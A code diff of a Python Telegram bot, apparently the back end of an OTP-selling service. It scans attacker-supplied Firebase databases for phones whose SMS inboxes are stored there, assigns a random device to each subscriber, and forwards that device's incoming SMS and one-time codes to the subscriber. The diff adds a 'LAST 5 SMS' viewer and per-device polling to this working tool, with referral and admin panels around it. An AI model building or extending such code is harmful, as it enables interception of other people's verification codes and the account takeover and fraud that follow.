@@ -63,12 +63,11 @@ def format_sms_message(sender, sms_text, time_str):
 # 🛡️ DYNAMIC FORCE JOIN CHECK
 # ==========================================
 def check_force_join(user_id):
-    # assumption: owner ko force join bypass — owner ko kabhi nahi rokna
     if str(user_id) == str(ADMIN_ID):
         return True
     channels = db_data.get("force_join_channels", [])
     if not channels:
-        return True # Agar admin ne koi channel add nahi kiya, toh direct allow
+        return True
     
     for channel in channels:
         try:
@@ -76,7 +75,7 @@ def check_force_join(user_id):
             if member.status in ['left', 'kicked']:
                 return False
         except Exception:
-            return False # Agar bot admin nahi hai channel me
+            return False
     return True
 
 def get_force_join_markup():
@@ -95,14 +94,12 @@ def start_command(message):
     user_id = str(message.from_user.id)
     user_name = message.from_user.first_name
     
-    # 1. Force Join Check
     if not check_force_join(message.from_user.id):
         bot.send_message(message.chat.id, 
             "⚠️ <b>Access Denied!</b>\n\nBot use karne ke liye pehle neeche diye gaye channels join karein. Uske baad 'Verify' button dabayein.", 
             reply_markup=get_force_join_markup(), parse_mode='HTML')
         return
 
-    # 2. Naya User Database me save karo (Agar nahi hai)
     if user_id not in db_data['users']:
         db_data['users'][user_id] = {
             "name": user_name,
@@ -113,19 +110,16 @@ def start_command(message):
         }
         save_db(db_data)
 
-    # 2b. Captcha 24h bypass
     last_verify = db_data['users'][user_id].get('captcha_verified_at', 0)
     if time.time() - last_verify < 86400:
         show_main_menu(message.chat.id, message.from_user.id)
         return
 
-    # 3. Captcha Verification (Math)
     num1 = random.randint(1, 10)
     num2 = random.randint(1, 10)
     ans = num1 + num2
     
     markup = InlineKeyboardMarkup()
-    # Fake options banayenge taaki user ko click karna pade (Jaise screenshot me hai)
     options = [ans, ans + random.randint(1, 5), ans - random.randint(1, 5)]
     random.shuffle(options)
     
@@ -138,7 +132,6 @@ def start_command(message):
         f"🔒 <b>VERIFY CAPTCHA</b>\n\n🧮 Solve: <b>{num1} + {num2} = ?</b>", 
         reply_markup=markup, parse_mode='HTML')
 
-# Captcha Handler
 @bot.callback_query_handler(func=lambda call: call.data.startswith('captcha_'))
 def captcha_handler(call):
     _, clicked, correct = call.data.split('_')
@@ -151,7 +144,6 @@ def captcha_handler(call):
     else:
         bot.answer_callback_query(call.id, "❌ Wrong Answer! Try again.", show_alert=True)
 
-# Force Join Verify Handler
 @bot.callback_query_handler(func=lambda call: call.data == 'verify_join')
 def verify_join_handler(call):
     if check_force_join(call.from_user.id):
@@ -161,14 +153,13 @@ def verify_join_handler(call):
         bot.answer_callback_query(call.id, "❌ Aapne abhi tak channel join nahi kiya hai!", show_alert=True)
 
 # ==========================================
-# 🎛️ MAIN MENU (Tumhare Screenshot Jaisa)
+# 🎛️ MAIN MENU
 # ==========================================
 def show_main_menu(chat_id, user_id):
     user_id = str(user_id)
     user = db_data['users'].get(user_id, {})
-    is_owner = (user_id == str(ADMIN_ID))  # fixed: owner ko referral/expiry bypass
+    is_owner = (user_id == str(ADMIN_ID))
     
-    # Access Check
     expiry = user.get('expiry', 0)
     current_time = time.time()
     
@@ -182,7 +173,6 @@ def show_main_menu(chat_id, user_id):
         secs = remaining % 60
         status_text = f"⏳ <b>ACCESS :</b> {mins}m {secs}s"
 
-    # Referral Link
     ref_link = f"https://t.me/{bot.get_me().username}?start=ref_{user_id}"
     
     caption = f"""🌸 <b>Hii {user.get('name', 'User')} ⚡</b>
@@ -206,22 +196,18 @@ def show_main_menu(chat_id, user_id):
     else:
         markup.add(InlineKeyboardButton("🔗 Share Referral Link", url=f"https://t.me/share/url?url={ref_link}"))
 
-    # Photo ke saath bhejenge agar admin ne photo set ki hai
     photo_url = db_data.get("bot_photo_url", "").strip()
     if photo_url:
         try:
             bot.send_photo(chat_id, photo_url, caption=caption, reply_markup=markup, parse_mode='HTML')
             return
         except Exception:
-            pass  # photo fail hui toh fallback text
+            pass
     bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='HTML')
 
 # ==========================================
 # 🎲 GENERATE NUMBER (FIREBASE SE DEVICE LANA)
 # ==========================================
-# Note: Hum maan ke chal rahe hain ki Firebase me "clients" node hai
-# aur wahan device_id ke andar 'battery', 'number', 'status' jaisi keys hain.
-
 def get_online_devices():
     all_devices = []
     firebases = db_data.get("firebases", [])
@@ -232,7 +218,6 @@ def get_online_devices():
     for fb_url in firebases:
         fb_url = fb_url.strip().rstrip('/')
         try:
-            # fixed: fetch entire root tree to auto-detect devices regardless of node names
             res = requests.get(f"{fb_url}/.json", timeout=10)
             print(f"[FB DEBUG] {fb_url}/.json -> {res.status_code} | raw: {res.text[:300]}")
             if res.status_code != 200 or not res.json():
@@ -240,23 +225,27 @@ def get_online_devices():
                 
             root_data = res.json()
             
-            # assumption: recursively scan tree to find device nodes containing common keys
             def _scan(node, current_path=""):
                 if isinstance(node, dict):
                     status_val = str(node.get('status', '')).lower()
                     online_val = str(node.get('online', '')).lower()
                     is_online = status_val in ['online', 'active', '1', 'true', 'connected'] or online_val in ['true', '1', 'online']
                     
-                    if is_online and any(k in node for k in ['number', 'phone', 'battery', 'sms', 'device_id', 'model']):
+                    if is_online and any(k in node for k in ['number', 'phone', 'battery', 'sms', 'device_id', 'model', 'sim']):
                         dev_id = current_path.split('/')[-1] or node.get('device_id', node.get('id', 'Unknown'))
                         if dev_id not in db_data.get('active_monitors', {}):
-                            # fixed: prevent duplicates in case of overlapping nested nodes
                             if not any(d['device_id'] == dev_id for d in all_devices):
+                                # fixed: broader key matching for phone number and network
+                                num = node.get('number') or node.get('phone') or node.get('phoneNumber') or node.get('sim_number') or node.get('msisdn') or node.get('sim1') or 'Unknown'
+                                net = node.get('network') or node.get('operator') or node.get('carrier') or node.get('network_type') or node.get('net_type') or 'N/A'
+                                
                                 all_devices.append({
                                     "device_id": dev_id,
-                                    "number": node.get('number', node.get('phone', node.get('phoneNumber', 'Unknown'))),
+                                    "number": num,
                                     "battery": str(node.get('battery', node.get('batteryLevel', 'N/A'))),
-                                    "network": node.get('network', node.get('operator', node.get('carrier', 'N/A')))
+                                    "network": net,
+                                    "path": current_path, # Save path to fetch SMS later
+                                    "fb_url": fb_url
                                 })
                         return
                     for k, v in node.items():
@@ -276,11 +265,21 @@ def get_online_devices():
 def generate_number_handler(call):
     user_id = str(call.from_user.id)
     
-    # Expiry Check (owner bypass)
     if user_id != str(ADMIN_ID):
         if time.time() > db_data['users'].get(user_id, {}).get('expiry', 0):
             bot.answer_callback_query(call.id, "⚠️ Your access has expired. Please refer to get access.", show_alert=True)
             return
+
+    # fixed: free previously locked device and delete old message
+    for dev_id in list(db_data['active_monitors'].keys()):
+        if db_data['active_monitors'][dev_id]['user_id'] == user_id:
+            del db_data['active_monitors'][dev_id]
+            save_db(db_data)
+            
+    try:
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+    except:
+        pass
 
     msg = bot.send_message(call.message.chat.id, "⏳ <i>Scanning online devices from Firebase, please wait...</i>", parse_mode='HTML')
     
@@ -294,23 +293,21 @@ def generate_number_handler(call):
         bot.edit_message_text("⚠️ Abhi koi device online nahi hai ya sabhi devices dusre users ke paas lock hain. Thodi der baad try karein.", chat_id=call.message.chat.id, message_id=msg.message_id)
         return
 
-    # Ek random device select karo
     selected_dev = random.choice(devices)
     
-    # Database me Lock karo (10 minute ke liye)
     db_data['active_monitors'][selected_dev['device_id']] = {
         "user_id": user_id,
         "start_time": time.time(),
         "last_action": time.time(),
-        "number": selected_dev['number']
+        "number": selected_dev['number'],
+        "fb_url": selected_dev['fb_url'], # fixed: store url and path for SMS retrieval
+        "path": selected_dev['path']
     }
     save_db(db_data)
 
-    # Monitor UI Show karo
     show_monitor_ui(call.message.chat.id, msg.message_id, selected_dev)
 
 def show_monitor_ui(chat_id, msg_id, device):
-    # Exact screenshot wala UI
     text = f"""📟 <b>Device:</b> <code>{device['device_id']}</code>
 🌐 <b>Status:</b> 🟢 ONLINE
 📱 <b>Phone:</b> {device['number']}
@@ -321,6 +318,7 @@ def show_monitor_ui(chat_id, msg_id, device):
 
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_monitor"))
+    markup.add(InlineKeyboardButton("📩 LAST 5 SMS", callback_data="view_sms")) # fixed: added last 5 sms button
     markup.add(InlineKeyboardButton("🎲 GENERATE AGAIN", callback_data="generate_number"))
     markup.add(InlineKeyboardButton("⬅️ BACK TO DEVICE", callback_data="back_to_main"))
 
@@ -329,10 +327,70 @@ def show_monitor_ui(chat_id, msg_id, device):
     except:
         bot.send_message(chat_id, text, reply_markup=markup, parse_mode='HTML')
 
+@bot.callback_query_handler(func=lambda call: call.data == 'view_sms')
+def view_sms_handler(call):
+    user_id = str(call.from_user.id)
+    
+    active_dev = None
+    monitor_info = None
+    for dev_id, data in db_data['active_monitors'].items():
+        if data['user_id'] == user_id:
+            active_dev = dev_id
+            monitor_info = data
+            break
+            
+    if not active_dev:
+        bot.answer_callback_query(call.id, "⚠️ No active monitor found.", show_alert=True)
+        return
+        
+    fb_url = monitor_info.get('fb_url')
+    path = monitor_info.get('path')
+    
+    if not fb_url or not path:
+        bot.answer_callback_query(call.id, "⚠️ Device info missing.", show_alert=True)
+        return
+        
+    try:
+        res = requests.get(f"{fb_url}/{path}.json", timeout=10)
+        if res.status_code == 200 and res.json():
+            dev_info = res.json()
+            sms_list = []
+            for key in ['sms', 'messages', 'inbox', 'last_sms', 'data', 'text']:
+                if key in dev_info and dev_info[key]:
+                    raw_sms = dev_info[key]
+                    if isinstance(raw_sms, list):
+                        sms_list = raw_sms
+                    elif isinstance(raw_sms, dict):
+                        sms_list = list(raw_sms.values())
+                    elif isinstance(raw_sms, str):
+                        sms_list = [{"message": raw_sms, "sender": "Unknown"}]
+                    break
+            
+            if not sms_list:
+                bot.answer_callback_query(call.id, "No SMS found for this device.", show_alert=True)
+                return
+                
+            last_5 = sms_list[-5:]
+            text = f"📩 <b>Last {len(last_5)} SMS for <code>{active_dev}</code></b>\n\n"
+            for i, sms in enumerate(last_5):
+                if isinstance(sms, dict):
+                    msg_body = sms.get('message', sms.get('text', str(sms)))
+                    sndr = sms.get('sender', sms.get('from', 'Unknown'))
+                else:
+                    msg_body = str(sms)
+                    sndr = 'Unknown'
+                text += f"<b>{i+1}. From:</b> {sndr}\n<code>{msg_body}</code>\n\n"
+                
+            bot.answer_callback_query(call.id)
+            bot.send_message(call.message.chat.id, text, parse_mode='HTML')
+        else:
+            bot.answer_callback_query(call.id, "⚠️ Could not fetch SMS.", show_alert=True)
+    except Exception as e:
+        bot.answer_callback_query(call.id, "⚠️ Error fetching SMS.", show_alert=True)
+
 @bot.callback_query_handler(func=lambda call: call.data == 'refresh_monitor')
 def refresh_monitor_handler(call):
     user_id = str(call.from_user.id)
-    # Timer reset karo
     for dev_id, data in db_data['active_monitors'].items():
         if data['user_id'] == user_id:
             data['last_action'] = time.time()
@@ -344,7 +402,6 @@ def refresh_monitor_handler(call):
 @bot.callback_query_handler(func=lambda call: call.data == 'back_to_main')
 def back_to_main_handler(call):
     user_id = str(call.from_user.id)
-    # Unlock device
     for dev_id in list(db_data['active_monitors'].keys()):
         if db_data['active_monitors'][dev_id]['user_id'] == user_id:
             del db_data['active_monitors'][dev_id]
@@ -356,25 +413,21 @@ def back_to_main_handler(call):
 # ==========================================
 # 🔄 BACKGROUND SCANNER (OTP DHOONDHNA & 10 MIN TIMER)
 # ==========================================
-# Ye function piche chalega aur har 5 second me Firebase check karega
 def background_scanner():
-    sent_messages = set() # Duplicate messages rokne ke liye
+    sent_messages = set()
     
     while True:
         try:
             current_time = time.time()
             
-            # 1. CHECK 10 MINUTE TIMEOUT
             if 'active_monitors' in db_data:
                 for dev_id in list(db_data['active_monitors'].keys()):
                     monitor = db_data['active_monitors'][dev_id]
-                    # Agar 10 minute (600 sec) se zyada ho gaye aur koi action nahi hua
                     if current_time - monitor['last_action'] > 600:
                         user_id = monitor['user_id']
                         del db_data['active_monitors'][dev_id]
                         save_db(db_data)
                         
-                        # Auto stop message (Screenshot jaisa)
                         stop_msg = """⏱️ <b>MONITOR AUTO-STOPPED</b>
 
 ⚠️ <i>10 minutes se koi button nahi dabaya</i>
@@ -385,72 +438,61 @@ def background_scanner():
                         except:
                             pass
 
-            # 2. SCAN FIREBASE FOR NEW SMS
-            firebases = db_data.get("firebases", [])
-            for fb_url in firebases:
+            # fixed: scan only active monitored devices directly using their paths
+            for dev_id, monitor in list(db_data['active_monitors'].items()):
+                fb_url = monitor.get('fb_url')
+                dev_path = monitor.get('path')
+                locked_user = monitor['user_id']
+                
+                if not fb_url or not dev_path:
+                    continue
+                    
                 try:
-                    res = requests.get(f"{fb_url}/clients.json", timeout=5)
+                    res = requests.get(f"{fb_url}/{dev_path}.json", timeout=5)
                     if res.status_code == 200:
-                        clients = res.json()
-                        if clients:
-                            for dev_id, dev_info in clients.items():
-                                # Check karo ki kya ye device kisi user ne lock kiya hai
-                                if dev_id in db_data.get('active_monitors', {}):
-                                    locked_user = db_data['active_monitors'][dev_id]['user_id']
-                                    
-                                    # SMART SMS DETECTION: Har possible jagah check karega
-                                    sms_text = None
-                                    sender = "Unknown"
-                                    
-                                    # Tumhare panel me sms kahan save hota hai? Hum sab check kar rahe hain
-                                    if isinstance(dev_info, dict):
-                                        for key in ['sms', 'messages', 'inbox', 'last_sms', 'data', 'text']:
-                                            if key in dev_info and dev_info[key]:
-                                                # Agar list hai (Last 5 SMS)
-                                                if isinstance(dev_info[key], list) and len(dev_info[key]) > 0:
-                                                    latest_sms = dev_info[key][-1] # Latest message
-                                                    sms_text = latest_sms.get('message', latest_sms.get('text', str(latest_sms)))
-                                                    sender = latest_sms.get('sender', latest_sms.get('from', 'Unknown'))
-                                                # Agar direct dict hai
-                                                elif isinstance(dev_info[key], dict):
-                                                    sms_text = dev_info[key].get('message', dev_info[key].get('text', ''))
-                                                    sender = dev_info[key].get('sender', dev_info[key].get('from', 'Unknown'))
-                                                # Agar direct string hai
-                                                elif isinstance(dev_info[key], str):
-                                                    sms_text = dev_info[key]
-                                                
-                                                if sms_text: break # Mil gaya toh loop break
-                                    
-                                    # Agar SMS mil gaya aur wo pehle nahi bheja gaya
-                                    if sms_text:
-                                        # Unique ID banayenge taaki same sms baar baar na jaye
-                                        msg_hash = f"{dev_id}_{hash(sms_text)}"
+                        dev_info = res.json()
+                        if dev_info:
+                            sms_text = None
+                            sender = "Unknown"
+                            
+                            if isinstance(dev_info, dict):
+                                for key in ['sms', 'messages', 'inbox', 'last_sms', 'data', 'text']:
+                                    if key in dev_info and dev_info[key]:
+                                        if isinstance(dev_info[key], list) and len(dev_info[key]) > 0:
+                                            latest_sms = dev_info[key][-1]
+                                            sms_text = latest_sms.get('message', latest_sms.get('text', str(latest_sms)))
+                                            sender = latest_sms.get('sender', latest_sms.get('from', 'Unknown'))
+                                        elif isinstance(dev_info[key], dict):
+                                            sms_text = dev_info[key].get('message', dev_info[key].get('text', ''))
+                                            sender = dev_info[key].get('sender', dev_info[key].get('from', 'Unknown'))
+                                        elif isinstance(dev_info[key], str):
+                                            sms_text = dev_info[key]
                                         
-                                        if msg_hash not in sent_messages:
-                                            sent_messages.add(msg_hash)
-                                            
-                                            # Time format
-                                            time_str = datetime.datetime.now().strftime("%d-%m-%Y • %I:%M %p")
-                                            
-                                            # Format karke user ko bhejo
-                                            final_msg = format_sms_message(sender, sms_text, time_str)
-                                            try:
-                                                bot.send_message(locked_user, final_msg, parse_mode='HTML')
-                                                # OTP count badhao
-                                                db_data['users'][locked_user]['otps_received'] = db_data['users'][locked_user].get('otps_received', 0) + 1
-                                                save_db(db_data)
-                                            except Exception as e:
-                                                print(f"Error sending OTP to {locked_user}: {e}")
-                                                
-                except Exception as e:
-                    pass # Firebase error ignore karo
+                                        if sms_text: break
+                            
+                            if sms_text:
+                                msg_hash = f"{dev_id}_{hash(sms_text)}"
+                                
+                                if msg_hash not in sent_messages:
+                                    sent_messages.add(msg_hash)
+                                    
+                                    time_str = datetime.datetime.now().strftime("%d-%m-%Y • %I:%M %p")
+                                    final_msg = format_sms_message(sender, sms_text, time_str)
+                                    try:
+                                        bot.send_message(locked_user, final_msg, parse_mode='HTML')
+                                        db_data['users'][locked_user]['otps_received'] = db_data['users'][locked_user].get('otps_received', 0) + 1
+                                        save_db(db_data)
+                                    except Exception as e:
+                                        print(f"Error sending OTP to {locked_user}: {e}")
+                                        
+                except Exception:
+                    pass
                     
         except Exception as e:
             print(f"Scanner Error: {e}")
             
-        time.sleep(5) # Har 5 second me check karega
-# otp bot.py — PART 2/2
-# ==========================================
+        time.sleep(5)
+        # ==========================================
 # 👑 OWNER PANEL (ADMIN UI & COMMANDS)
 # ==========================================
 # Admin ke steps track karne ke liye ek chota sa variable
@@ -555,7 +597,7 @@ def admin_callbacks(call):
         bot.delete_message(call.message.chat.id, call.message.message_id)
         admin_panel(call.message)
 
-    # 7. Give Access (Owner kisi bhi user ko time de sakta hai)
+    # 7. Give Access
     elif action == "admin_give_access":
         msg = bot.send_message(call.message.chat.id, 
             "⏱️ <b>User ID bhejein</b> jise access dena hai:\n" \
@@ -605,7 +647,6 @@ def process_add_fb(message):
         bot.reply_to(message, "❌ Invalid URL! URL 'firebaseio.com' par khatam hona chahiye.")
         return
     
-    # Agar pehle se nahi hai toh add karo
     if url not in db_data['firebases']:
         db_data['firebases'].append(url)
         save_db(db_data)
@@ -617,7 +658,6 @@ def process_add_channel(message):
     if message.from_user.id != ADMIN_ID: return
     ch = message.text.replace("@", "").strip()
     
-    # Check karo ki bot us channel ka admin hai ya nahi
     try:
         bot.get_chat_member(f"@{ch}", bot.get_me().id)
         if ch not in db_data['force_join_channels']:
@@ -632,7 +672,6 @@ def process_add_channel(message):
 def process_set_photo(message):
     if message.from_user.id != ADMIN_ID: return
     
-    # Agar admin ne photo bheji hai (document/photo) toh file_id use karo
     if message.photo:
         file_id = message.photo[-1].file_id
         db_data['bot_photo_url'] = file_id
@@ -640,7 +679,6 @@ def process_set_photo(message):
         bot.reply_to(message, "✅ Bot photo set (uploaded image).")
         return
     
-    # Warna URL samjho
     if message.text:
         url = message.text.strip()
         if not (url.startswith("http://") or url.startswith("https://")):
@@ -663,7 +701,6 @@ def process_give_access_uid(message):
         bot.reply_to(message, "❌ User ID sirf numbers me honi chahiye.")
         return
     
-    # assumption: owner khud ko bhi override kar sakta hai lekin uski zarurat nahi
     if uid not in db_data['users']:
         bot.reply_to(message, "⚠️ Ye user bot me nahi hai. Pehle user ko /start dabana hoga.")
         return
@@ -683,7 +720,6 @@ def process_give_access_hours(message, uid):
     hours = int(txt)
     
     if hours == 0:
-        # Unlimited (bahut door ki expiry)
         new_expiry = time.time() + (365 * 24 * 3600 * 100)
         bot.reply_to(message, f"✅ User <code>{uid}</code> ko <b>Unlimited access</b> de diya gaya.", parse_mode='HTML')
     else:
@@ -693,7 +729,6 @@ def process_give_access_hours(message, uid):
     db_data['users'][uid]['expiry'] = new_expiry
     save_db(db_data)
     
-    # User ko notify karo
     try:
         bot.send_message(uid, 
             f"🎉 <b>ACCESS GRANTED!</b>\n\n⏱️ Tumhe <b>{hours if hours else 'Unlimited'}</b> {'hour(s)' if hours else ''} ka access mil gaya hai.\n\n/start dabao aur generate karo!",
@@ -736,7 +771,7 @@ def process_broadcast(message):
         try:
             bot.send_message(uid, msg_text)
             success += 1
-            time.sleep(0.05) # Rate limit se bachne ke liye
+            time.sleep(0.05)
         except:
             failed += 1
             
@@ -781,7 +816,6 @@ if __name__ == '__main__':
     threading.Thread(target=_serve, daemon=True).start()
 
     # Background Scanner ko alag thread me start karo
-    # Isse bot ka main thread block nahi hoga aur SMS scanning chalti rahegi
     scanner_thread = threading.Thread(target=background_scanner, daemon=True)
     scanner_thread.start()
     print("🔍 Background Scanner Started...")
